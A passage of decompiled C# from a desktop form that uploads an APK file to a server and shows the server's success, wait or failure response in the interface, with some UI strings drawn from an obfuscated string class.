				CS_0024_003C_003E8__locals16._0024VB_0024Me.apkicon.Image = Resources.androidhead;
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Directory.Exists(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir))
				{
					Directory.Delete(CS_0024_003C_003E8__locals16._0024VB_0024Local_tempDir, recursive: true);
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}));
		goto IL_040e;
		IL_040e:
		return null;
	}

	private void UploadApp_Load(object sender, EventArgs e)
	{
		uploadbar.MaximumSize = new Size(0, 0);
		uploadbar.Height = 8;
		lblStatus.Text = string.Format(EXGuarder._590A3B52, BTConst.checkappstr);
		mytitle.Text = string.Format(EXGuarder._3B5E3B29, BTConst.addappstorstr);
		baseloader.Enabled = true;
		baseloader.Visible = true;
		if (!BackgroundWorker1.IsBusy)
		{
			BackgroundWorker1.RunWorkerAsync();
		}
		pinme(null, null);
	}

	private void upbtn_Click(object sender, EventArgs e)
	{
		if (upbtn.TagString != null && Operators.CompareString(upbtn.TagString, EXGuarder._4D11502C, TextCompare: false) == 0)
		{
			Close();
			return;
		}
		upbtn.Enabled = false;
		uploadbar.Visible = true;
		Thread thread = new Thread([SpecialName] async () =>
		{
			string text = await useraccount.AddApp(httpClient, serverip, TargetAPKPATH, this);
			Debuger.Log_d("Add app Response", text);
			try
			{
				Dictionary<string, string> dictionary = JsonConvert.DeserializeObject<Dictionary<string, string>>(text);
				if (dictionary.ContainsKey("Success"))
				{
					string text2 = dictionary["Success"].Trim('"');
					if (text2.EqualsIgnoreCase("wait"))
					{
						BTAlerter.Success($"{BTConst.apupscsstr}");
						waitstate();
					}
					else
					{
						BTAlerter.erroes($"Failed to add App: {text2}");
						UpdateState(text2, Color.Red);
						Endit(allgood: false);
					}
				}
				else if (dictionary.ContainsKey("Fail"))
				{
					string arg = dictionary["Fail"].Trim('"');
					BTAlerter.erroes($"Failed to add App: {arg}");
					UpdateState(arg, Color.Red);
					Endit(allgood: false);
				}
				else
				{
					BTAlerter.erroes("Unexpected server response 2.");
					UpdateState("Unexpected server response.", Color.Red);
					Endit(allgood: false);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				BTAlerter.erroes("Unexpected server response 3.");
				UpdateState("Unexpected server response.", Color.Red);
				Endit(allgood: false);
				ProjectData.ClearProjectError();
			}
		});
		thread.IsBackground = true;
		thread.Start();
	}
}
